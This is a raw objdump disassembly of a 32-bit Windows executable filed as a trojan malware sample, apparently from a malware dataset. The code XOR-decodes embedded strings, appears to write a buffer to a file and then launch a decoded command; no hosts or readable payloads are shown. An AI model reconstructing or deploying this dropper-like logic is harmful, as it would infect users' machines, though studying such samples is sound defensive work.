
malware_samples/trojan/eb571d401c88c3332a9cc21695e623f9919df47b18a1896398061f3b52700b0d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401009:	90                   	nop
  40100a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40100d:	40                   	inc    %eax
  40100e:	50                   	push   %eax
  40100f:	e8 3c 05 00 00       	call   0x401550
  401014:	83 c4 04             	add    $0x4,%esp
  401017:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40101a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40101d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401020:	01 c1                	add    %eax,%ecx
  401022:	b8 00 00 00 00       	mov    $0x0,%eax
  401027:	88 01                	mov    %al,(%ecx)
  401029:	b8 00 00 00 00       	mov    $0x0,%eax
  40102e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401031:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401034:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401037:	39 c8                	cmp    %ecx,%eax
  401039:	0f 8d 48 00 00 00    	jge    0x401087
  40103f:	e9 09 00 00 00       	jmp    0x40104d
  401044:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401047:	40                   	inc    %eax
  401048:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40104b:	eb e4                	jmp    0x401031
  40104d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401050:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401053:	01 c1                	add    %eax,%ecx
  401055:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401058:	8b 55 08             	mov    0x8(%ebp),%edx
  40105b:	01 c2                	add    %eax,%edx
  40105d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401060:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401063:	b9 20 00 00 00       	mov    $0x20,%ecx
  401068:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40106b:	99                   	cltd
  40106c:	f7 f9                	idiv   %ecx
  40106e:	b8 00 20 40 00       	mov    $0x402000,%eax
  401073:	01 d0                	add    %edx,%eax
  401075:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401078:	0f be 09             	movsbl (%ecx),%ecx
  40107b:	0f be 10             	movsbl (%eax),%edx
  40107e:	31 d1                	xor    %edx,%ecx
  401080:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401083:	88 08                	mov    %cl,(%eax)
  401085:	eb bd                	jmp    0x401044
  401087:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40108a:	c9                   	leave
  40108b:	c3                   	ret
  40108c:	55                   	push   %ebp
  40108d:	89 e5                	mov    %esp,%ebp
  40108f:	81 ec 38 04 00 00    	sub    $0x438,%esp
  401095:	90                   	nop
  401096:	b8 0c 00 00 00       	mov    $0xc,%eax
  40109b:	50                   	push   %eax
  40109c:	b8 00 00 00 00       	mov    $0x0,%eax
  4010a1:	50                   	push   %eax
  4010a2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010a5:	50                   	push   %eax
  4010a6:	e8 ad 04 00 00       	call   0x401558
  4010ab:	83 c4 0c             	add    $0xc,%esp
  4010ae:	b8 21 20 40 00       	mov    $0x402021,%eax
  4010b3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010b6:	b8 26 20 40 00       	mov    $0x402026,%eax
  4010bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4010be:	b8 30 20 40 00       	mov    $0x402030,%eax
  4010c3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4010c6:	b8 10 00 00 00       	mov    $0x10,%eax
  4010cb:	50                   	push   %eax
  4010cc:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d1:	50                   	push   %eax
  4010d2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010d5:	50                   	push   %eax
  4010d6:	e8 7d 04 00 00       	call   0x401558
  4010db:	83 c4 0c             	add    $0xc,%esp
  4010de:	b8 04 00 00 00       	mov    $0x4,%eax
  4010e3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4010e6:	b8 09 00 00 00       	mov    $0x9,%eax
  4010eb:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4010ee:	b8 14 00 00 00       	mov    $0x14,%eax
  4010f3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4010f6:	b8 01 00 00 00       	mov    $0x1,%eax
  4010fb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010fe:	b8 00 00 00 00       	mov    $0x0,%eax
  401103:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  401109:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40110f:	83 f8 01             	cmp    $0x1,%eax
  401112:	0f 8d fe 01 00 00    	jge    0x401316
  401118:	e9 0f 00 00 00       	jmp    0x40112c
  40111d:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401123:	40                   	inc    %eax
  401124:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  40112a:	eb dd                	jmp    0x401109
  40112c:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401132:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401137:	0f af c1             	imul   %ecx,%eax
  40113a:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40113d:	01 c1                	add    %eax,%ecx
  40113f:	b8 45 20 40 00       	mov    $0x402045,%eax
  401144:	50                   	push   %eax
  401145:	8b 01                	mov    (%ecx),%eax
  401147:	50                   	push   %eax
  401148:	e8 13 04 00 00       	call   0x401560
  40114d:	83 c4 08             	add    $0x8,%esp
  401150:	83 f8 00             	cmp    $0x0,%eax
  401153:	0f 85 4a 00 00 00    	jne    0x4011a3
  401159:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40115f:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401164:	0f af c1             	imul   %ecx,%eax
  401167:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40116a:	01 c1                	add    %eax,%ecx
  40116c:	83 c1 04             	add    $0x4,%ecx
  40116f:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401175:	c1 e0 04             	shl    $0x4,%eax
  401178:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40117b:	01 c2                	add    %eax,%edx
  40117d:	83 c2 04             	add    $0x4,%edx
  401180:	8b 02                	mov    (%edx),%eax
  401182:	50                   	push   %eax
  401183:	8b 01                	mov    (%ecx),%eax
  401185:	50                   	push   %eax
  401186:	e8 75 fe ff ff       	call   0x401000
  40118b:	83 c4 08             	add    $0x8,%esp
  40118e:	50                   	push   %eax
  40118f:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  401195:	50                   	push   %eax
  401196:	e8 cd 03 00 00       	call   0x401568
  40119b:	83 c4 08             	add    $0x8,%esp
  40119e:	e9 90 00 00 00       	jmp    0x401233
  4011a3:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4011a9:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4011ae:	0f af c1             	imul   %ecx,%eax
  4011b1:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4011b4:	01 c1                	add    %eax,%ecx
  4011b6:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4011bc:	c1 e0 04             	shl    $0x4,%eax
  4011bf:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4011c2:	01 c2                	add    %eax,%edx
  4011c4:	8b 02                	mov    (%edx),%eax
  4011c6:	50                   	push   %eax
  4011c7:	8b 01                	mov    (%ecx),%eax
  4011c9:	50                   	push   %eax
  4011ca:	e8 31 fe ff ff       	call   0x401000
  4011cf:	83 c4 08             	add    $0x8,%esp
  4011d2:	50                   	push   %eax
  4011d3:	e8 98 03 00 00       	call   0x401570
  4011d8:	83 c4 04             	add    $0x4,%esp
  4011db:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  4011e1:	ba 0c 00 00 00       	mov    $0xc,%edx
  4011e6:	0f af ca             	imul   %edx,%ecx
  4011e9:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4011ec:	01 ca                	add    %ecx,%edx
  4011ee:	83 c2 04             	add    $0x4,%edx
  4011f1:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  4011f7:	c1 e1 04             	shl    $0x4,%ecx
  4011fa:	89 85 cc fb ff ff    	mov    %eax,-0x434(%ebp)
  401200:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401203:	01 c8                	add    %ecx,%eax
  401205:	83 c0 04             	add    $0x4,%eax
  401208:	8b 08                	mov    (%eax),%ecx
  40120a:	51                   	push   %ecx
  40120b:	8b 02                	mov    (%edx),%eax
  40120d:	50                   	push   %eax
  40120e:	e8 ed fd ff ff       	call   0x401000
  401213:	83 c4 08             	add    $0x8,%esp
  401216:	50                   	push   %eax
  401217:	8b 85 cc fb ff ff    	mov    -0x434(%ebp),%eax
  40121d:	50                   	push   %eax
  40121e:	b8 57 20 40 00       	mov    $0x402057,%eax
  401223:	50                   	push   %eax
  401224:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  40122a:	50                   	push   %eax
  40122b:	e8 48 03 00 00       	call   0x401578
  401230:	83 c4 10             	add    $0x10,%esp
  401233:	b8 5d 20 40 00       	mov    $0x40205d,%eax
  401238:	50                   	push   %eax
  401239:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  40123f:	50                   	push   %eax
  401240:	e8 3b 03 00 00       	call   0x401580
  401245:	83 c4 08             	add    $0x8,%esp
  401248:	89 85 c8 fb ff ff    	mov    %eax,-0x438(%ebp)
  40124e:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401254:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401259:	0f af c1             	imul   %ecx,%eax
  40125c:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40125f:	01 c1                	add    %eax,%ecx
  401261:	83 c1 08             	add    $0x8,%ecx
  401264:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40126a:	c1 e0 04             	shl    $0x4,%eax
  40126d:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  401270:	01 c2                	add    %eax,%edx
  401272:	83 c2 08             	add    $0x8,%edx
  401275:	8b 02                	mov    (%edx),%eax
  401277:	50                   	push   %eax
  401278:	8b 01                	mov    (%ecx),%eax
  40127a:	50                   	push   %eax
  40127b:	e8 80 fd ff ff       	call   0x401000
  401280:	83 c4 08             	add    $0x8,%esp
  401283:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  401289:	c1 e1 04             	shl    $0x4,%ecx
  40128c:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40128f:	01 ca                	add    %ecx,%edx
  401291:	83 c2 08             	add    $0x8,%edx
  401294:	8b 8d c8 fb ff ff    	mov    -0x438(%ebp),%ecx
  40129a:	51                   	push   %ecx
  40129b:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012a0:	51                   	push   %ecx
  4012a1:	8b 0a                	mov    (%edx),%ecx
  4012a3:	51                   	push   %ecx
  4012a4:	50                   	push   %eax
  4012a5:	e8 de 02 00 00       	call   0x401588
  4012aa:	83 c4 10             	add    $0x10,%esp
  4012ad:	8b 85 c8 fb ff ff    	mov    -0x438(%ebp),%eax
  4012b3:	50                   	push   %eax
  4012b4:	e8 d7 02 00 00       	call   0x401590
  4012b9:	83 c4 04             	add    $0x4,%esp
  4012bc:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4012c2:	c1 e0 04             	shl    $0x4,%eax
  4012c5:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4012c8:	01 c1                	add    %eax,%ecx
  4012ca:	83 c1 0c             	add    $0xc,%ecx
  4012cd:	8b 01                	mov    (%ecx),%eax
  4012cf:	83 f8 00             	cmp    $0x0,%eax
  4012d2:	0f 84 39 00 00 00    	je     0x401311
  4012d8:	b8 04 00 00 00       	mov    $0x4,%eax
  4012dd:	50                   	push   %eax
  4012de:	b8 60 20 40 00       	mov    $0x402060,%eax
  4012e3:	50                   	push   %eax
  4012e4:	e8 17 fd ff ff       	call   0x401000
  4012e9:	83 c4 08             	add    $0x8,%esp
  4012ec:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4012f1:	51                   	push   %ecx
  4012f2:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012f7:	51                   	push   %ecx
  4012f8:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012fd:	51                   	push   %ecx
  4012fe:	8d 8d d4 fb ff ff    	lea    -0x42c(%ebp),%ecx
  401304:	51                   	push   %ecx
  401305:	50                   	push   %eax
  401306:	b8 00 00 00 00       	mov    $0x0,%eax
  40130b:	50                   	push   %eax
  40130c:	e8 87 02 00 00       	call   0x401598
  401311:	e9 07 fe ff ff       	jmp    0x40111d
  401316:	b8 00 00 00 00       	mov    $0x0,%eax
  40131b:	c9                   	leave
  40131c:	c3                   	ret
  40131d:	00 00                	add    %al,(%eax)
  40131f:	00 55 89             	add    %dl,-0x77(%ebp)
  401322:	e5 81                	in     $0x81,%eax
  401324:	ec                   	in     (%dx),%al
  401325:	08 00                	or     %al,(%eax)
  401327:	00 00                	add    %al,(%eax)
  401329:	90                   	nop
  40132a:	b8 00 00 00 00       	mov    $0x0,%eax
  40132f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401332:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401335:	c1 e0 02             	shl    $0x2,%eax
  401338:	b9 00 30 40 00       	mov    $0x403000,%ecx
  40133d:	01 c1                	add    %eax,%ecx
  40133f:	b8 00 30 40 00       	mov    $0x403000,%eax
  401344:	39 c1                	cmp    %eax,%ecx
  401346:	0f 84 2e 00 00 00    	je     0x40137a
  40134c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40134f:	89 c1                	mov    %eax,%ecx
  401351:	40                   	inc    %eax
  401352:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401355:	c1 e1 02             	shl    $0x2,%ecx
  401358:	b8 00 30 40 00       	mov    $0x403000,%eax
  40135d:	01 c8                	add    %ecx,%eax
  40135f:	8b 08                	mov    (%eax),%ecx
  401361:	8b 45 10             	mov    0x10(%ebp),%eax
  401364:	50                   	push   %eax
  401365:	8b 45 0c             	mov    0xc(%ebp),%eax
  401368:	50                   	push   %eax
  401369:	8b 45 08             	mov    0x8(%ebp),%eax
  40136c:	50                   	push   %eax
  40136d:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401370:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401373:	ff d0                	call   *%eax
  401375:	83 c4 0c             	add    $0xc,%esp
  401378:	eb b8                	jmp    0x401332
  40137a:	c9                   	leave
  40137b:	c3                   	ret
  40137c:	55                   	push   %ebp
  40137d:	89 e5                	mov    %esp,%ebp
  40137f:	81 ec 08 00 00 00    	sub    $0x8,%esp
  401385:	90                   	nop
  401386:	b8 00 00 00 00       	mov    $0x0,%eax
  40138b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40138e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401391:	c1 e0 02             	shl    $0x2,%eax
  401394:	b9 00 30 40 00       	mov    $0x403000,%ecx
  401399:	01 c1                	add    %eax,%ecx
  40139b:	b8 00 30 40 00       	mov    $0x403000,%eax
  4013a0:	39 c1                	cmp    %eax,%ecx
  4013a2:	0f 84 1d 00 00 00    	je     0x4013c5
  4013a8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013ab:	48                   	dec    %eax
  4013ac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013af:	c1 e0 02             	shl    $0x2,%eax
  4013b2:	b9 00 30 40 00       	mov    $0x403000,%ecx
  4013b7:	01 c1                	add    %eax,%ecx
  4013b9:	8b 01                	mov    (%ecx),%eax
  4013bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4013be:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013c1:	ff d0                	call   *%eax
  4013c3:	eb c9                	jmp    0x40138e
  4013c5:	c9                   	leave
  4013c6:	c3                   	ret
  4013c7:	55                   	push   %ebp
  4013c8:	89 e5                	mov    %esp,%ebp
  4013ca:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4013d0:	90                   	nop
  4013d1:	8b 45 10             	mov    0x10(%ebp),%eax
  4013d4:	50                   	push   %eax
  4013d5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4013d8:	50                   	push   %eax
  4013d9:	8b 45 08             	mov    0x8(%ebp),%eax
  4013dc:	50                   	push   %eax
  4013dd:	e8 3e ff ff ff       	call   0x401320
  4013e2:	83 c4 0c             	add    $0xc,%esp
  4013e5:	8b 05 e4 20 40 00    	mov    0x4020e4,%eax
  4013eb:	8b 0d e8 20 40 00    	mov    0x4020e8,%ecx
  4013f1:	8b 15 ec 20 40 00    	mov    0x4020ec,%edx
  4013f7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4013fa:	8b 02                	mov    (%edx),%eax
  4013fc:	50                   	push   %eax
  4013fd:	8b 01                	mov    (%ecx),%eax
  4013ff:	50                   	push   %eax
  401400:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401403:	8b 00                	mov    (%eax),%eax
  401405:	50                   	push   %eax
  401406:	e8 81 fc ff ff       	call   0x40108c
  40140b:	83 c4 0c             	add    $0xc,%esp
  40140e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401411:	e8 66 ff ff ff       	call   0x40137c
  401416:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401419:	c9                   	leave
  40141a:	c3                   	ret
  40141b:	55                   	push   %ebp
  40141c:	89 e5                	mov    %esp,%ebp
  40141e:	81 ec 00 00 00 00    	sub    $0x0,%esp
  401424:	90                   	nop
  401425:	8b 45 08             	mov    0x8(%ebp),%eax
  401428:	8b 08                	mov    (%eax),%ecx
  40142a:	8b 45 08             	mov    0x8(%ebp),%eax
  40142d:	50                   	push   %eax
  40142e:	8b 01                	mov    (%ecx),%eax
  401430:	50                   	push   %eax
  401431:	e8 6a 01 00 00       	call   0x4015a0
  401436:	83 c4 08             	add    $0x8,%esp
  401439:	c9                   	leave
  40143a:	c2 04 00             	ret    $0x4
  40143d:	55                   	push   %ebp
  40143e:	89 e5                	mov    %esp,%ebp
  401440:	81 ec 08 00 00 00    	sub    $0x8,%esp
  401446:	90                   	nop
  401447:	b8 04 00 00 00       	mov    $0x4,%eax
  40144c:	50                   	push   %eax
  40144d:	b8 00 00 00 00       	mov    $0x0,%eax
  401452:	50                   	push   %eax
  401453:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401456:	50                   	push   %eax
  401457:	e8 fc 00 00 00       	call   0x401558
  40145c:	83 c4 0c             	add    $0xc,%esp
  40145f:	b8 1b 14 40 00       	mov    $0x40141b,%eax
  401464:	50                   	push   %eax
  401465:	e8 3e 01 00 00       	call   0x4015a8
  40146a:	b8 01 00 00 00       	mov    $0x1,%eax
  40146f:	50                   	push   %eax
  401470:	e8 3b 01 00 00       	call   0x4015b0
  401475:	83 c4 04             	add    $0x4,%esp
  401478:	b8 00 00 03 00       	mov    $0x30000,%eax
  40147d:	50                   	push   %eax
  40147e:	b8 00 00 01 00       	mov    $0x10000,%eax
  401483:	50                   	push   %eax
  401484:	e8 2f 01 00 00       	call   0x4015b8
  401489:	83 c4 08             	add    $0x8,%esp
  40148c:	8b 05 e4 20 40 00    	mov    0x4020e4,%eax
  401492:	8b 0d e8 20 40 00    	mov    0x4020e8,%ecx
  401498:	8b 15 ec 20 40 00    	mov    0x4020ec,%edx
  40149e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014a1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014a4:	50                   	push   %eax
  4014a5:	8b 05 00 30 40 00    	mov    0x403000,%eax
  4014ab:	50                   	push   %eax
  4014ac:	52                   	push   %edx
  4014ad:	51                   	push   %ecx
  4014ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014b1:	50                   	push   %eax
  4014b2:	e8 09 01 00 00       	call   0x4015c0
  4014b7:	83 c4 14             	add    $0x14,%esp
  4014ba:	8b 05 e4 20 40 00    	mov    0x4020e4,%eax
  4014c0:	8b 0d e8 20 40 00    	mov    0x4020e8,%ecx
  4014c6:	8b 15 ec 20 40 00    	mov    0x4020ec,%edx
  4014cc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014cf:	8b 02                	mov    (%edx),%eax
  4014d1:	50                   	push   %eax
  4014d2:	8b 01                	mov    (%ecx),%eax
  4014d4:	50                   	push   %eax
  4014d5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014d8:	8b 00                	mov    (%eax),%eax
  4014da:	50                   	push   %eax
  4014db:	e8 e7 fe ff ff       	call   0x4013c7
  4014e0:	83 c4 0c             	add    $0xc,%esp
  4014e3:	50                   	push   %eax
  4014e4:	e8 df 00 00 00       	call   0x4015c8
  4014e9:	83 c4 04             	add    $0x4,%esp
  4014ec:	c9                   	leave
  4014ed:	c3                   	ret
  4014ee:	55                   	push   %ebp
  4014ef:	89 e5                	mov    %esp,%ebp
  4014f1:	81 ec 04 00 00 00    	sub    $0x4,%esp
  4014f7:	90                   	nop
  4014f8:	8b 05 e4 20 40 00    	mov    0x4020e4,%eax
  4014fe:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401501:	89 08                	mov    %ecx,(%eax)
  401503:	8b 05 e8 20 40 00    	mov    0x4020e8,%eax
  401509:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40150c:	89 08                	mov    %ecx,(%eax)
  40150e:	b8 00 00 03 00       	mov    $0x30000,%eax
  401513:	50                   	push   %eax
  401514:	b8 00 00 01 00       	mov    $0x10000,%eax
  401519:	50                   	push   %eax
  40151a:	e8 99 00 00 00       	call   0x4015b8
  40151f:	83 c4 08             	add    $0x8,%esp
  401522:	8b 05 e4 20 40 00    	mov    0x4020e4,%eax
  401528:	8b 0d e8 20 40 00    	mov    0x4020e8,%ecx
  40152e:	8b 15 ec 20 40 00    	mov    0x4020ec,%edx
  401534:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401537:	8b 02                	mov    (%edx),%eax
  401539:	50                   	push   %eax
  40153a:	8b 01                	mov    (%ecx),%eax
  40153c:	50                   	push   %eax
  40153d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401540:	8b 00                	mov    (%eax),%eax
  401542:	50                   	push   %eax
  401543:	e8 44 fb ff ff       	call   0x40108c
  401548:	83 c4 0c             	add    $0xc,%esp
  40154b:	c9                   	leave
  40154c:	c3                   	ret
  40154d:	00 00                	add    %al,(%eax)
  40154f:	00 ff                	add    %bh,%bh
  401551:	25 c0 20 40 00       	and    $0x4020c0,%eax
  401556:	00 00                	add    %al,(%eax)
  401558:	ff 25 c4 20 40 00    	jmp    *0x4020c4
  40155e:	00 00                	add    %al,(%eax)
  401560:	ff 25 c8 20 40 00    	jmp    *0x4020c8
  401566:	00 00                	add    %al,(%eax)
  401568:	ff 25 cc 20 40 00    	jmp    *0x4020cc
  40156e:	00 00                	add    %al,(%eax)
  401570:	ff 25 d0 20 40 00    	jmp    *0x4020d0
  401576:	00 00                	add    %al,(%eax)
  401578:	ff 25 d4 20 40 00    	jmp    *0x4020d4
  40157e:	00 00                	add    %al,(%eax)
  401580:	ff 25 d8 20 40 00    	jmp    *0x4020d8
  401586:	00 00                	add    %al,(%eax)
  401588:	ff 25 dc 20 40 00    	jmp    *0x4020dc
  40158e:	00 00                	add    %al,(%eax)
  401590:	ff 25 e0 20 40 00    	jmp    *0x4020e0
  401596:	00 00                	add    %al,(%eax)
  401598:	ff 25 08 21 40 00    	jmp    *0x402108
  40159e:	00 00                	add    %al,(%eax)
  4015a0:	ff 25 f0 20 40 00    	jmp    *0x4020f0
  4015a6:	00 00                	add    %al,(%eax)
  4015a8:	ff 25 10 21 40 00    	jmp    *0x402110
  4015ae:	00 00                	add    %al,(%eax)
  4015b0:	ff 25 f4 20 40 00    	jmp    *0x4020f4
  4015b6:	00 00                	add    %al,(%eax)
  4015b8:	ff 25 f8 20 40 00    	jmp    *0x4020f8
  4015be:	00 00                	add    %al,(%eax)
  4015c0:	ff 25 fc 20 40 00    	jmp    *0x4020fc
  4015c6:	00 00                	add    %al,(%eax)
  4015c8:	ff 25 00 21 40 00    	jmp    *0x402100
	...
